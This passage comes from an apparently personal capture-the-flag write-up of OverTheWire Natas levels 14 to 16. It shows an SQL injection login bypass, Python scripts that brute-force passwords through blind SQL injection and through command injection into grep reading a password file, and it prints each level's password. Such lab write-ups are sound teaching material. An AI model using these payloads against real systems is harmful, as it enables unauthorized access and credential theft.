+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;"Executing&nbsp;query:&nbsp;$query<span style="color:#7f0044;font-weight:400">&lt;br&gt;</span>";
+            </div>
+        </div><br>
+        <br>
+        Two things to note here:<br>
+        - if we set a debug paramater we will be able to see the query that's being executed<br>
+        - more importantly, we can see that the sql query is being passed to the databse without first checking the user input<br>
+        it will simply take whatever we put in the username and password fields and accept them<br>
+        <br>
+        In that case, we can terminate the string early with # and prevent password checks from happening.<br>
+        Since we don't know any usernames, we can sql inject within the username paramater in order to get logged in (although you could happen to make an educated guess and provide natas15 as the username...)<br>
+        <br>
+        <code>username: hey" OR 1=1 #<br>
+        password: pass</code><br>
+        <br>
+        The query will look like this if you submit what's above:<br>
+        <code>SELECT * from users where username="hey" OR 1=1 # and password="pass";</code><br>
+        <br>
+        <code>OR 1=1</code> will return all values in the username field, because 1=1 is always true<br>
+        And since there's no password checks (everything after the # is commented out), the query is only checking whether the username we submitted is present (which it will, because we've selected all of them with 1=1)<br>
+        <br>
+        Similarly, <code>-- -</code> can also be used to comment out the rest of the query e.g.<br>
+        <code>username: hey" OR 1=1 -- -<br>
+        password: pass</code><br>
+        <br>
+        Password for the next level:<br>
+        AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br>
+        <br>
+        <a id="h2-16" name="h2-16"></a><strong></strong>
+        <h2><strong>#Natas 15</strong></h2><br>
+        <a href="http://natas15.natas.labs.overthewire.org/">http://natas15.natas.labs.overthewire.org/</a><br>
+        natas15<br>
+        AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br>
+        <br>
+        Ok so this challenge was really daunting to me at first. If you view the source code for the page, you'll see from these lines:<br>
+        <br>
+            <div class="codebox">
+                &nbsp;&nbsp;&nbsp;&nbsp;if(mysql_num_rows($res)&nbsp;&gt;&nbsp;0)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;"This&nbsp;user&nbsp;exists.<span style="color:#7f0044;font-weight:400">&lt;br&gt;</span>";<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;"This&nbsp;user&nbsp;doesn't&nbsp;exist.<span style="color:#7f0044;font-weight:400">&lt;br&gt;</span>";<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;"Error&nbsp;in&nbsp;query.<span style="color:#7f0044;font-weight:400">&lt;br&gt;</span>";<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;
+            </div>
+        </div><br>
+        <br>
+        that this is a blind sql injection challenge. It's blind because we don't get any feedback from the server about whether the sql injection worked or not (unlike in the previous challenge where, when the sql injection worked, we got logged in and received the password for the next level).<br>
+        <br>
+        However, what we do get are response/error messages: "this user exists", "this user doesn't exist", "error in query". We can make use of these in order to check whether our blind injection is working or not.<br>
+        <br>
+        If in the username field you type "natas16" and click 'check username', you'll get a response saying "This user exists." If you type somthing that isn't a valid username, e.g. "potatoes", you'll get a response saying "This user doens't exist." This will form the basis of the bruteforce sql injection.<br>
+        <br>
+        The 'username' field on this page is still sql injectable, as the input from the user is taken as-is without sanitisation first:<br>
+        <code>SELECT * from users where username=\"".$_REQUEST["username"]."\"";</code><br>
+        <br>
+        Therefore, we'll use the 'username' field as our paramater to sql inject into and use the responses/error messages to determine whether or not our inputs are correct.<br>
+        <br>
+        We've kindly been given the table 'users' and its columns in the source code:<br>
+            <div class="codebox">
+                CREATE&nbsp;TABLE&nbsp;`users`&nbsp;(<br>
+                &nbsp;&nbsp;`username`&nbsp;varchar(64)&nbsp;DEFAULT&nbsp;NULL,<br>
+                &nbsp;&nbsp;`password`&nbsp;varchar(64)&nbsp;DEFAULT&nbsp;NULL<br>
+                );&nbsp;
+            </div>
+        </div><br>
+        <br>
+        If we didn't have this information, I think you'd have to blind inject to find out the table/column names first<br>
+        <br>
+        This is what our sql inject will be (entered into the username field):<br>
+        <code>natas16" AND password LIKE BINARY "char%" #</code><br>
+        (char = anything from a-z A-Z 0-9)<br>
+        The full sql statement submitted to the server will look like this:<br>
+        <code>SELECT * from users WHERE username="natas16" AND password LIKE BINARY "char%" #</code><br>
+        <br>
+        'LIKE' in SQL is used in a WHERE query to search for a pattern in a column (meaning that we can search for individual letters/numbers, in this case we're searching for letters/numbers in the password column)<br>
+        The BINARY function in SQL performs a byte-by-byte comparison of two values<br>
+        take the sql command BINARY "HELLO" = "hello"; for example- this will return 0 (false) because on a byte-by-byte basis they're not equivalent (H is not equal to h)<br>
+        Using BINARY is needed because we're testing both uppercase and lowercase values<br>
+        (the opposite to this is SELECT "HELLO" = "hello"; which performs a character-by-character comparison. This command will return 1 (true) because on a character-by-character basis, H is equal to h.)<br>
+        <br>
+        To sum up, our sql query will only return as correct if the username 'natas16' exists AND the character N exists in the password field.<br>
+        i.e. if the username 'natas16' exists AND the character N exists in the password column for natas16, we'll get the page saying "This users exists."<br>
+        if not, we get the page saying "This user doesn't exist."<br>
+        <br>
+        Now we write a python script to do it all for us:<br>
+        <br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br>
+                <span style="color:#0088ff;font-weight:400">#HTTPBasicAuth&nbsp;needs&nbsp;importing&nbsp;because&nbsp;to&nbsp;access&nbsp;the&nbsp;natas&nbsp;labs&nbsp;requires&nbsp;authentication</span><br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;requests.auth&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;HTTPBasicAuth<br>
+                <br>
+                password&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br>
+                chars&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><br>
+                <br>
+                while&nbsp;<span style="color:#ff0044;font-weight:400">True</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;char&nbsp;in&nbsp;chars:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;requests.post(<span style="color:#3ad900;font-weight:400">'http://natas15.natas.labs.overthewire.org/index.php'</span>,&nbsp;data&nbsp;=&nbsp;{<span style="color:#3ad900;font-weight:400">'username'</span>:<span style="color:#3ad900;font-weight:400">'natas16"&nbsp;AND&nbsp;password&nbsp;LIKE&nbsp;BINARY&nbsp;"'</span>&nbsp;+&nbsp;password&nbsp;+&nbsp;char&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'%"&nbsp;#'</span>},&nbsp;auth=HTTPBasicAuth(<span style="color:#3ad900;font-weight:400">'natas15'</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'</span>))<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#store&nbsp;response&nbsp;to&nbsp;POST&nbsp;request&nbsp;in&nbsp;a&nbsp;variable&nbsp;called&nbsp;'response'</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;r.text<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#search&nbsp;through&nbsp;the&nbsp;response&nbsp;for&nbsp;"exists".&nbsp;if&nbsp;"exists"&nbsp;is&nbsp;present,&nbsp;it&nbsp;will&nbsp;return&nbsp;the&nbsp;value&nbsp;817&nbsp;(i&nbsp;have&nbsp;no&nbsp;idea&nbsp;why,&nbsp;it's&nbsp;just&nbsp;the&nbsp;result&nbsp;i&nbsp;got&nbsp;:/)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check&nbsp;=&nbsp;response.find(<span style="color:#3ad900;font-weight:400">"exists"</span>)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;check&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">817</span>:<br>
+                <span style="color:#0088ff;font-weight:400">#add&nbsp;the&nbsp;submitted&nbsp;character,&nbsp;if&nbsp;correct,&nbsp;into&nbsp;the&nbsp;password&nbsp;variable</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;=&nbsp;password&nbsp;+&nbsp;char<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(password)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
+            </div>
+        </div><br>
+        <br>
+        Output:<br>
+        <em>W<br>
+        Wa<br>
+        WaI<br>
+        WaIH<br>
+        WaIHE<br>
+        WaIHEa<br>
+        WaIHEac<br>
+        WaIHEacj<br>
+        WaIHEacj6<br>
+        WaIHEacj63<br>
+        WaIHEacj63w<br>
+        WaIHEacj63wn<br>
+        WaIHEacj63wnN<br>
+        WaIHEacj63wnNI<br>
+        WaIHEacj63wnNIB<br>
+        WaIHEacj63wnNIBR<br>
+        WaIHEacj63wnNIBRO<br>
+        WaIHEacj63wnNIBROH<br>
+        WaIHEacj63wnNIBROHe<br>
+        WaIHEacj63wnNIBROHeq<br>
+        WaIHEacj63wnNIBROHeqi<br>
+        WaIHEacj63wnNIBROHeqi3<br>
+        WaIHEacj63wnNIBROHeqi3p<br>
+        WaIHEacj63wnNIBROHeqi3p9<br>
+        WaIHEacj63wnNIBROHeqi3p9t<br>
+        WaIHEacj63wnNIBROHeqi3p9t0<br>
+        WaIHEacj63wnNIBROHeqi3p9t0m<br>
+        WaIHEacj63wnNIBROHeqi3p9t0m5<br>
+        WaIHEacj63wnNIBROHeqi3p9t0m5n<br>
+        WaIHEacj63wnNIBROHeqi3p9t0m5nh<br>
+        WaIHEacj63wnNIBROHeqi3p9t0m5nhm<br>
+        WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</em><br>
+        <br>
+        It worked! I was genuinely surprised that it did. The script can definitely be optimised in some way but I don't know enough to know how. I also couldn't think of a way to terminate the script after it had found the whole password, but realised after running it that it didn't matter because the script would just stop producing results when there were no more characters to be added. I CTRL-C'd once I reached that point.<br>
+        <br>
+        Password for the next level:<br>
+        WaIHEacj63wnNIBROHeqi3p9t0m5nhmh<br>
+        <br>
+        <a id="h2-17" name="h2-17"></a><strong></strong>
+        <h2><strong>#Natas 16</strong></h2><br>
+        <a href="http://natas16.natas.labs.overthewire.org">http://natas16.natas.labs.overthewire.org</a><br>
+        natas16<br>
+        WaIHEacj63wnNIBROHeqi3p9t0m5nhmh<br>
+        <br>
+        Command injection!<br>
+        <code>passthru("grep -i \"$key\" dictionary.txt");</code><br>
+        <br>
+        However, there's now filtering on the input:<br>
+            <div class="codebox">
+                if(preg_match('/[;|&amp;`\'"]/',$key))&nbsp;{<br>
+                print&nbsp;"Input&nbsp;contains&nbsp;an&nbsp;illegal&nbsp;character!";
+            </div>
+        </div><br>
+        <br>
+        They've filtered out everything they need to except for $<br>
+        We can use $(&lt;command&gt;) to inject code, but with double quotes filtered we have to operate within the grep command.<br>
+        If we use the existing search function to find a word in the dictionary (as it's intended), we get a result e.g.<br>
+        <br>
+        Find words containing: green<br>
+        <br>
+        Output:<br>
+        evergreen<br>
+        evergreens<br>
+        green<br>
+        green's<br>
+        ...<br>
+        <br>
+        This challenge, similar to natas15, is blind but we can use the results of the grep command to figure out if we're on the right track or not. We provide a word that will obviously be in the dictionary (green) followed by our inject with a grep for a letter that could be in /etc/natas_webpass/natas17.<br>
+        <br>
+        This is what our inject will be:<br>
+        <code>green$(grep b /etc/natas_webpass/natas17)</code><br>
+        <br>
+        The full command being executed will look like this:<br>
+        <code>grep -i green$(grep b /etc/natas_webpass/natas17) dictionary.txt</code><br>
+        <br>
+        Because our inject is in the middle of the command (grep -i &lt;our inject&gt; dictionary.txt), I think that means it'll get executed first (the original grep -i is still waiting for a file to grep through- dictionary.txt).<br>
+        As a result, this means that if you we grep for B in /etc/natas_webpass/natas17 and it's there, we won't get our result of 'green' from dictionary.txt because our injected command got completed, cancelling out the grep of dictionary.txt<br>
+        <br>
+        Less wordy version:<br>
+        Find words containing: green$(grep &lt;letter&gt; /etc/natas_webpass/natas17)<br>
+        <br>
+        No output = &lt;letter&gt; exists in /etc/natas_webpass/natas17<br>
+        Output = &lt;letter&gt; does not exist in /etc/natas_webpass/natas17<br>
+        <br>
+        No we write a script to do all our testing for us (it's almost identical the one in natas15):<br>
+        <br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br>
+                <span style="color:#0088ff;font-weight:400">#HTTPBasicAuth&nbsp;needs&nbsp;importing&nbsp;because&nbsp;to&nbsp;access&nbsp;the&nbsp;natas&nbsp;labs&nbsp;requires&nbsp;authentication</span><br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;requests.auth&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;HTTPBasicAuth<br>
+                <br>
+                password&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br>
+                chars&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><br>
+                <br>
+                while&nbsp;<span style="color:#ff0044;font-weight:400">True</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;char&nbsp;in&nbsp;chars:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;requests.post(<span style="color:#3ad900;font-weight:400">'http://natas16.natas.labs.overthewire.org/index.php'</span>,&nbsp;data&nbsp;=&nbsp;{<span style="color:#3ad900;font-weight:400">'needle'</span>:<span style="color:#3ad900;font-weight:400">'green$(grep&nbsp;'</span>&nbsp;+&nbsp;char&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'&nbsp;/etc/natas_webpass/natas17)'</span>},&nbsp;auth=HTTPBasicAuth(<span style="color:#3ad900;font-weight:400">'natas16'</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'</span>))<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#store&nbsp;response&nbsp;to&nbsp;POST&nbsp;request&nbsp;in&nbsp;a&nbsp;variable&nbsp;called&nbsp;'response'</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;r.text<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#search&nbsp;through&nbsp;the&nbsp;response&nbsp;for&nbsp;"exists".&nbsp;if&nbsp;"exists"&nbsp;is&nbsp;present,&nbsp;it&nbsp;will&nbsp;return&nbsp;the&nbsp;value&nbsp;1003&nbsp;(i&nbsp;have&nbsp;no&nbsp;idea&nbsp;why,&nbsp;i&nbsp;don't&nbsp;really&nbsp;know&nbsp;how&nbsp;the&nbsp;find()&nbsp;method&nbsp;works&nbsp;:/)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check&nbsp;=&nbsp;response.find(<span style="color:#3ad900;font-weight:400">"green"</span>)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;check&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">1003</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br>
+                <span style="color:#0088ff;font-weight:400">#add&nbsp;the&nbsp;submitted&nbsp;character,&nbsp;if&nbsp;correct,&nbsp;into&nbsp;the&nbsp;password&nbsp;variable</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;=&nbsp;password&nbsp;+&nbsp;char<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(password)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
+            </div>
+        </div><br>
+        <br>
+        Output:<br>
+        <em>b<br>
+        bc<br>
+        bcd<br>
+        bcdg<br>
+        bcdgh<br>
+        bcdghk<br>
+        bcdghkm<br>
+        bcdghkmn<br>
+        bcdghkmnq<br>
+        bcdghkmnqr<br>
+        bcdghkmnqrs<br>
+        bcdghkmnqrsw<br>
+        bcdghkmnqrswA<br>
+        bcdghkmnqrswAG<br>
+        bcdghkmnqrswAGH<br>
+        bcdghkmnqrswAGHN<br>
+        bcdghkmnqrswAGHNP<br>
+        bcdghkmnqrswAGHNPQ<br>
+        bcdghkmnqrswAGHNPQS<br>
+        bcdghkmnqrswAGHNPQSW<br>
+        bcdghkmnqrswAGHNPQSW0<br>
+        bcdghkmnqrswAGHNPQSW03<br>
+        bcdghkmnqrswAGHNPQSW035<br>
+        bcdghkmnqrswAGHNPQSW0357<br>
+        bcdghkmnqrswAGHNPQSW03578<br>
+        bcdghkmnqrswAGHNPQSW035789</em><br>
+        <br>
+        (At this point it started to repeat itself as it finished iterating through all the characters and I hadn't coded in a way for the script to stop- e.g.)<br>
+        bcdghkmnqrswAGHNPQSW035789b<br>
+        bcdghkmnqrswAGHNPQSW035789bc<br>
+        bcdghkmnqrswAGHNPQSW035789bcd<br>
+        bcdghkmnqrswAGHNPQSW035789bcdg<br>
+        bcdghkmnqrswAGHNPQSW035789bcdgh<br>
+        bcdghkmnqrswAGHNPQSW035789bcdghk<br>
+        bcdghkmnqrswAGHNPQSW035789bcdghkm<br>
+        bcdghkmnqrswAGHNPQSW035789bcdghkmn<br>
+        <br>
+        WRONG :/<br>
+        <br>
+        What we have here is all the characters in /etc/natas_webpass/natas17 but in the order that we tested for the characters. The script needs to be modified so that we can find the actual password. All I did was add a ^ into "grep ^password+char /etc/natas..."<br>
+        ^&lt;pattern&gt; in regex means match any string that starts with &lt;pattern&gt; (e.g. ^hello will match any string that starts with "hello")<br>
+        So we start with nothing, and ask the script to only match strings that start with ^&lt;character&gt;<br>
+        e.g. ^a ^b ^c (match strings that start with a, match strings that start with b, match strings that start with c) until, say for example the string starts with 5, we start over again- ^5a ^5b ^5c<br>
+        <br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br>
+                <span style="color:#0088ff;font-weight:400">#HTTPBasicAuth&nbsp;needs&nbsp;importing&nbsp;because&nbsp;to&nbsp;access&nbsp;the&nbsp;natas&nbsp;labs&nbsp;requires&nbsp;authentication</span><br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;requests.auth&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;HTTPBasicAuth<br>
+                <br>
+                password&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br>
+                chars&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><br>
+                <br>
+                while&nbsp;<span style="color:#ff0044;font-weight:400">True</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;char&nbsp;in&nbsp;chars:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;requests.post(<span style="color:#3ad900;font-weight:400">'http://natas16.natas.labs.overthewire.org/index.php'</span>,&nbsp;data&nbsp;=&nbsp;{<span style="color:#3ad900;font-weight:400">'needle'</span>:<span style="color:#3ad900;font-weight:400">'green$(grep&nbsp;^'</span>&nbsp;+&nbsp;password&nbsp;+&nbsp;char&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'&nbsp;/etc/natas_webpass/natas17)'</span>},&nbsp;auth=HTTPBasicAuth(<span style="color:#3ad900;font-weight:400">'natas16'</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'</span>))<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#store&nbsp;response&nbsp;to&nbsp;POST&nbsp;request&nbsp;in&nbsp;a&nbsp;variable&nbsp;called&nbsp;'response'</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;r.text<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#search&nbsp;through&nbsp;the&nbsp;response&nbsp;for&nbsp;"exists".&nbsp;if&nbsp;"exists"&nbsp;is&nbsp;present,&nbsp;it&nbsp;will&nbsp;return&nbsp;the&nbsp;value&nbsp;1003&nbsp;(i&nbsp;have&nbsp;no&nbsp;idea&nbsp;why,&nbsp;i&nbsp;don't&nbsp;really&nbsp;know&nbsp;how&nbsp;the&nbsp;find()&nbsp;method&nbsp;works&nbsp;:/)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check&nbsp;=&nbsp;response.find(<span style="color:#3ad900;font-weight:400">"green"</span>)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;check&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">1003</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br>
+                <span style="color:#0088ff;font-weight:400">#add&nbsp;the&nbsp;submitted&nbsp;character,&nbsp;if&nbsp;correct,&nbsp;into&nbsp;the&nbsp;password&nbsp;variable</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;=&nbsp;password&nbsp;+&nbsp;char<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(password)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
+            </div>
+        </div><br>
+        <br>
+        Output:<br>
+        <em>8<br>
+        8P<br>
+        8Ps<br>
+        8Ps3<br>
+        8Ps3H<br>
+        8Ps3H0<br>
+        8Ps3H0G<br>
+        8Ps3H0GW<br>
+        8Ps3H0GWb<br>
+        8Ps3H0GWbn<br>
+        8Ps3H0GWbn5<br>
+        8Ps3H0GWbn5r<br>
+        8Ps3H0GWbn5rd<br>
+        8Ps3H0GWbn5rd9<br>
+        8Ps3H0GWbn5rd9S<br>
+        8Ps3H0GWbn5rd9S7<br>
+        8Ps3H0GWbn5rd9S7G<br>
+        8Ps3H0GWbn5rd9S7Gm<br>
+        8Ps3H0GWbn5rd9S7GmA<br>
+        8Ps3H0GWbn5rd9S7GmAd<br>
+        8Ps3H0GWbn5rd9S7GmAdg<br>
+        8Ps3H0GWbn5rd9S7GmAdgQ<br>
+        8Ps3H0GWbn5rd9S7GmAdgQN<br>
+        8Ps3H0GWbn5rd9S7GmAdgQNd<br>
+        8Ps3H0GWbn5rd9S7GmAdgQNdk<br>
+        8Ps3H0GWbn5rd9S7GmAdgQNdkh<br>
+        8Ps3H0GWbn5rd9S7GmAdgQNdkhP<br>
+        8Ps3H0GWbn5rd9S7GmAdgQNdkhPk<br>
+        8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq<br>
+        8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9<br>
+        8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c<br>
+        8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</em><br>
+        <br>
+        Password for the next level:<br>
+        8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw<br>
+        <br>
+        At this point I've stopped for now. I think there's a few more challenges so I'll revisit them some other time :)<br>
+    </writeup>
+</section>
+
+</body>
+</html>
